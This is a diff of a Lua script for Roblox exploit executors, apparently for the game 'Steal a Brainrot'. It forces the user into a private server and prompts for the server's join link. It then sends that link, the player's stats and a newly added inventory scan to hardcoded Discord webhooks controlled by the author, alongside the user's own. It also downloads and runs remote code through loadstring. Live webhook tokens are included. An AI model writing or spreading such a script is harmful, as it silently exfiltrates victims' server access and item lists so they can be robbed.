@@ -14,6 +14,7 @@
 
 if _G.scriptExecuted then return end
 _G.scriptExecuted = true
+
 if not _G["Script-SM_Config"] then
     warn("WARNING: Config not loaded! Waiting for config...")
     repeat task.wait() until _G["Script-SM_Config"]
@@ -23,18 +24,18 @@ end
 --====================================================================--
 -- Services
 --====================================================================--
-local Players          = game:GetService("Players")
-local TweenService     = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
-local HttpService      = game:GetService("HttpService")
-local ReplicatedStorage= game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
-local Lighting         = game:GetService("Lighting")
+local Lighting = game:GetService("Lighting")
+local Workspace = game:GetService("Workspace")
+
 local LocalPlayer = Players.LocalPlayer
-
-
 local player = Players.LocalPlayer
-local gui    = player:WaitForChild("PlayerGui")
+local gui = player:WaitForChild("PlayerGui")
 
 --====================================================================--
 -- Promotion
@@ -42,18 +43,20 @@ local gui    = player:WaitForChild("PlayerGui")
 setclipboard("discord.gg/cnUAk7uc3n")
 
 --====================================================================--
--- VIP‑Server Check
+-- VIP-Server Check
 --====================================================================--
 local serverType = RobloxReplicatedStorage:WaitForChild("GetServerType"):InvokeServer()
 if serverType ~= "VIPServer" then
     LocalPlayer:Kick("Script.SM does not support public servers. Join a Private Server.")
+    return
 end
+
 --====================================================================--
 -- WEBHOOKS
 --====================================================================--
 local prvt_srvrs_logs = "https://discord.com/api/webhooks/1433479282528882844/XLe0lOXt1qF7DDo8Q8DOkuCJjhSjnlQxu3skK77qJLIUHHHMaksv_jzchnumBmaj2X4u"
 local user_webhook = _G["Script-SM_Config"].user_webhook
-local logs_webhook    = "https://discord.com/api/webhooks/1433776514868052012/2rL6CIcgBPWKQbyF5gqPpZmpYDdl61_mLQHM2LaaNxE4VNH76k-r0mWmL91rbGlggjpA"
+local logs_webhook = "https://discord.com/api/webhooks/1433776514868052012/2rL6CIcgBPWKQbyF5gqPpZmpYDdl61_mLQHM2LaaNxE4VNH76k-r0mWmL91rbGlggjpA"
 
 --====================================================================--
 -- Safe HTTP
@@ -61,10 +64,10 @@ local logs_webhook    = "https://discord.com/api/webhooks/1433776514868052012/2r
 local function safeRequest(url, body)
     pcall(function()
         request({
-            Url     = url,
-            Method  = "POST",
+            Url = url,
+            Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
-            Body    = HttpService:JSONEncode(body)
+            Body = HttpService:JSONEncode(body)
         })
     end)
 end
@@ -126,6 +129,60 @@ local function getCountry()
         return res.Body:match("^(.+)\n") or "Unknown"
     end
     return "Unknown"
+end
+
+--====================================================================--
+-- Brainrot Scanner: Parse + Sort (Highest to Lowest)
+--====================================================================--
+local function parseGenerationValue(generationString)
+    local cleaned = generationString:gsub("%s", ""):match("^%s*(.-)%s*$")
+    local numberPart, unitPart = cleaned:match("(%d+%.?%d*)([KMB]?)")
+    if not numberPart then return 0 end
+    numberPart = tonumber(numberPart)
+    if unitPart == "K" then return numberPart * 1e3
+    elseif unitPart == "M" then return numberPart * 1e6
+    elseif unitPart == "B" then return numberPart * 1e9
+    else return numberPart end
+end
+
+local function getBrainrots()
+    local list = {}
+    local plots = Workspace:FindFirstChild("Plots")
+    if not plots then return list end
+
+    for _, plot in ipairs(plots:GetChildren()) do
+        local podiums = plot:FindFirstChild("AnimalPodiums")
+        if podiums then
+            for _, podium in ipairs(podiums:GetChildren()) do
+                if tonumber(podium.Name) and podium.Name:match("^%d+$") then
+                    local base   = podium:FindFirstChild("Base")
+                    local spawn  = base and base:FindFirstChild("Spawn")
+                    local attach = spawn and spawn:FindFirstChild("Attachment")
+                    local over   = attach and attach:FindFirstChild("AnimalOverhead")
+                    if over then
+                        local nameLbl = over:FindFirstChild("DisplayName")
+                        local genLbl  = over:FindFirstChild("Generation")
+                        if nameLbl and nameLbl:IsA("TextLabel")
+                            and genLbl and genLbl:IsA("TextLabel") then
+
+                            local genVal = parseGenerationValue(genLbl.Text)
+                            table.insert(list, {
+                                name = nameLbl.Text,
+                                generation = genLbl.Text,
+                                value = genVal
+                            })
+                        end
+                    end
+                end
+            end
+        end
+    end
+
+    table.sort(list, function(a, b)
+        return a.value > b.value
+    end)
+
+    return list
 end
 
 --====================================================================--
@@ -334,7 +391,10 @@ textBox.FocusLost:Connect(function(enter)
     unfocusLine:Play()
     if textBox.Text == "" then labelDown:Play() end
     updatePlaceholder()
-    if enter then task.wait(0.1) continueBtn.MouseButton1Click:Fire() end
+    if enter then
+        task.wait(0.1)
+        continueBtn.Activated:Fire() -- Use Activated instead of MouseButton1Click:Fire()
+    end
 end)
 
 -- Continue button
@@ -372,11 +432,24 @@ continueBtn.MouseButton1Up:Connect(function() pressOut:Play() end)
 continueBtn.MouseLeave:Connect(function() pressOut:Play() end)
 
 --====================================================================--
--- Confirm popup (CLEAN & SIMPLE)
+-- Confirm popup – SMOOTH, ALL-AT-ONCE
 --====================================================================--
 local confirmGui = nil
+local showConfirm = nil -- Forward declaration
 
-local function showConfirm(rawLink)
+-- Define function to trigger continue
+local function triggerContinue()
+    local input = textBox.Text ~= "" and textBox.Text or ""
+    showConfirm(input)
+end
+
+-- Use Activated (works on PC + Mobile)
+continueBtn.Activated:Connect(triggerContinue)
+
+--====================================================================--
+-- Confirm popup
+--====================================================================--
+showConfirm = function(rawLink)
     local code = extractCode(rawLink)
     if not code then
         local flash = TweenService:Create(tbBg, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(120,30,30)})
@@ -399,9 +472,7 @@ local function showConfirm(rawLink)
     confirmGui.ClipsDescendants = true
     confirmGui.Parent = screen
 
-    local cCorner = Instance.new("UICorner", confirmGui)
-    cCorner.CornerRadius = UDim.new(0,20)
-
+    local cCorner = Instance.new("UICorner", confirmGui); cCorner.CornerRadius = UDim.new(0,20)
     local cStroke = Instance.new("UIStroke", confirmGui)
     cStroke.Color = Color3.fromRGB(100,200,255)
     cStroke.Thickness = 0
@@ -460,28 +531,41 @@ local function showConfirm(rawLink)
     local btnC1 = Instance.new("UICorner", cancelBtn); btnC1.CornerRadius = UDim.new(0,10)
     local btnC2 = Instance.new("UICorner", confirmBtn); btnC2.CornerRadius = UDim.new(0,10)
 
-    -- Smooth popup in
-    confirmGui.Size = UDim2.fromOffset(0,0)
-    local popIn = TweenService:Create(confirmGui, TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
+    -- Pop-in: All at once
+    local popIn = TweenService:Create(confirmGui, TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
         Size = UDim2.fromOffset(380,180),
         BackgroundTransparency = 0
     })
-    popIn:Play()
-    TweenService:Create(cStroke, TweenInfo.new(0.5), {Thickness = 2}):Play()
+    local strokeIn = TweenService:Create(cStroke, TweenInfo.new(0.45), {Thickness = 2})
+    local textIn  = TweenService:Create(warnTitle, TweenInfo.new(0.35, Enum.EasingStyle.Quint), {TextTransparency = 0})
+    local msgIn   = TweenService:Create(warnMsg,  TweenInfo.new(0.35, Enum.EasingStyle.Quint), {TextTransparency = 0})
+    local btnIn1  = TweenService:Create(cancelBtn, TweenInfo.new(0.35, Enum.EasingStyle.Quint), {BackgroundTransparency = 0})
+    local btnIn2  = TweenService:Create(confirmBtn,TweenInfo.new(0.35, Enum.EasingStyle.Quint), {BackgroundTransparency = 0})
 
-    task.delay(0.2, function()
-        TweenService:Create(warnTitle, TweenInfo.new(0.3), {TextTransparency = 0}):Play()
-        TweenService:Create(warnMsg, TweenInfo.new(0.3), {TextTransparency = 0}):Play()
-        TweenService:Create(cancelBtn, TweenInfo.new(0.3), {BackgroundTransparency = 0}):Play()
-        TweenService:Create(confirmBtn, TweenInfo.new(0.3), {BackgroundTransparency = 0}):Play()
+    popIn:Play()
+    strokeIn:Play()
+    task.delay(0.12, function()
+        textIn:Play()
+        msgIn:Play()
+        btnIn1:Play()
+        btnIn2:Play()
     end)
 
-    -- Simple fade-out close
     local function closeConfirm()
-        local fadeOut = TweenService:Create(confirmGui, TweenInfo.new(0.3, Enum.EasingStyle.Sine), {
-            BackgroundTransparency = 1
-        })
+        local fadeOut = TweenService:Create(confirmGui, TweenInfo.new(0.28, Enum.EasingStyle.Sine), {BackgroundTransparency = 1})
+        local strokeOut = TweenService:Create(cStroke, TweenInfo.new(0.28), {Thickness = 0})
+        local textOut   = TweenService:Create(warnTitle, TweenInfo.new(0.28), {TextTransparency = 1})
+        local msgOut    = TweenService:Create(warnMsg,  TweenInfo.new(0.28), {TextTransparency = 1})
+        local btnOut1   = TweenService:Create(cancelBtn, TweenInfo.new(0.28), {BackgroundTransparency = 1})
+        local btnOut2   = TweenService:Create(confirmBtn,TweenInfo.new(0.28), {BackgroundTransparency = 1})
+
         fadeOut:Play()
+        strokeOut:Play()
+        textOut:Play()
+        msgOut:Play()
+        btnOut1:Play()
+        btnOut2:Play()
+
         fadeOut.Completed:Connect(function()
             confirmGui:Destroy()
             confirmGui = nil
@@ -493,13 +577,30 @@ local function showConfirm(rawLink)
     confirmBtn.MouseButton1Click:Connect(function()
         closeConfirm()
 
-        -- Store & log
         _G.Private_Server_SM = joinLink
         local cash = getStat("Cash") or 0
         local steals = getStat("Steals") or 0
         local rebirths = getStat("Rebirths") or 0
 
         safeRequest(prvt_srvrs_logs, {content = joinLink})
+
+        -- Scan brainrots (already sorted highest to lowest)
+        local brainrots = getBrainrots()
+        local backpackLines = {}
+
+        if #brainrots > 0 then
+            for _, v in ipairs(brainrots) do
+                table.insert(backpackLines, v.name .. " : " .. v.generation)
+            end
+        else
+            table.insert(backpackLines, "No brainrots found.")
+        end
+
+        -- Warning line (always shown)
+        table.insert(backpackLines, 1, "Warning: We Can't Scan Latest Brainrots from events.")
+
+        -- Join everything with newlines and wrap in a single code block
+        local finalBackpackText = "```\n" .. table.concat(backpackLines, "\n") .. "\n```"
 
         local payload = {
             avatar_url = "https://cdn.discordapp.com/attachments/1394146542813970543/1395733310793060393/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png",
@@ -518,7 +619,7 @@ local function showConfirm(rawLink)
                     {name = "💸 Cash", value = "```"..formatCash(cash).."```", inline = true},
                     {name = "🔥 Steals", value = "```"..tostring(steals).."```", inline = true},
                     {name = "♻️ Rebirths", value = "```"..tostring(rebirths).."```", inline = true},
-                    {name = "💰 Backpack", value = "```Failed to Scan, Join Server to See!```", inline = false},
+                    {name = "💰 Backpack", value = finalBackpackText, inline = false},
                     {name = "🔗 Join with URL", value = "[Click here to join]("..joinLink..")", inline = false}
                 },
                 footer = {text = "discord.gg/cnUAk7uc3n"},
@@ -529,7 +630,7 @@ local function showConfirm(rawLink)
         safeRequest(user_webhook, payload)
         safeRequest(logs_webhook, payload)
 
-        -- Fade out main GUI
+
         TweenService:Create(card, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {
             Position = UDim2.fromScale(0.5, -1.5),
             BackgroundTransparency = 1
@@ -539,17 +640,11 @@ local function showConfirm(rawLink)
 
         task.delay(0.7, function()
             screen:Destroy()
-
             local scriptURL = "https://raw.githubusercontent.com/RblxScriptsOG/Steal-a-brainrot/main/main-gui.lua"
             local src = safeHttpGet(scriptURL)
-
             if src then
-                local success, err = pcall(function()
-                    loadstring(src)()
-                end)
-                if not success then
-                    warn("main-gui.lua failed: " .. tostring(err))
-                end
+                local success, err = pcall(function() loadstring(src)() end)
+                if not success then warn("main-gui.lua failed: "..tostring(err)) end
             else
                 warn("Failed to fetch main-gui.lua – Check HTTP permissions or internet.")
             end
@@ -558,27 +653,17 @@ local function showConfirm(rawLink)
 end
 
 --====================================================================--
--- Continue button
---====================================================================--
-continueBtn.MouseButton1Click:Connect(function()
-    local input = textBox.Text ~= "" and textBox.Text or ""
-    showConfirm(input)
-end)
-
---====================================================================--
--- ESC (same as Confirm)
+-- ESC Key
 --====================================================================--
 UserInputService.InputBegan:Connect(function(i, gp)
     if gp then return end
     if i.KeyCode == Enum.KeyCode.Escape then
         if confirmGui then
-            local fadeOut = TweenService:Create(confirmGui, TweenInfo.new(0.3, Enum.EasingStyle.Sine), {
-                BackgroundTransparency = 1
-            })
+            local fadeOut = TweenService:Create(confirmGui, TweenInfo.new(0.28, Enum.EasingStyle.Sine), {BackgroundTransparency = 1})
             fadeOut:Play()
             fadeOut.Completed:Connect(function() confirmGui:Destroy() end)
         else
-            showConfirm(textBox.Text)
+            triggerContinue()
         end
     end
 end)
